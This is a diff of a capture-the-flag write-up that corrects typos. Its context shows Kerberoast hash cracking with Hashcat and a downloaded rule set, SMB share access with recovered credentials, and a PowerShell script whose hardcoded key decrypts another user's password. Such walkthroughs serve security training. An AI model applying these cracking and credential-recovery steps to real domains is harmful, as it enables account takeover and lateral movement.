@@ -30,15 +30,15 @@ We prepare a password list using CeWL, keeping in mind that explicitly also digi
 <p>In addition, also following the hint, the OneRuleToRuleThemAll rule for Hashcat is downloaded:</p>
 <pre><code>curl -OJ https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
 </code></pre>
-<p>Equipped with these tool, we can let Hashcat crack the password:</p>
+<p>Equipped with these tools, we can let Hashcat crack the password:</p>
 <pre><code>hashcat -m 13100 -a0 spn.txt --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 --opencl-device-types 1,2 wordlist
 </code></pre>
-<p>Hashcat find the password for <code>elfu_svc</code> to be <code>Snow2021!</code>.</p>
+<p>Hashcat finds the password for <code>elfu_svc</code> to be <code>Snow2021!</code>.</p>
 <h3 id="access-to-elfu_svc_shr">Access to elfu_svc_shr</h3>
 <p>With this information we can get access to the elfu_svc_shr file share in 10.128.3.30:</p>
 <pre><code>smbclient -U elfu_svc '\\10.128.3.30\elfu_svc_shr'
 </code></pre>
-<p>On this share are several Powershell scripts. One of them, <code>GetProcessInfo.ps1</code> holds credentials for the <code>user remote_elf</code>:</p>
+<p>On this share are several Powershell scripts. One of them, <code>GetProcessInfo.ps1</code> holds credentials for the user <code>remote_elf</code>:</p>
 <pre><code>$SecStringPassword = "76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA"
 $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
 $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("elfu.local\remote_elf", $aPass)
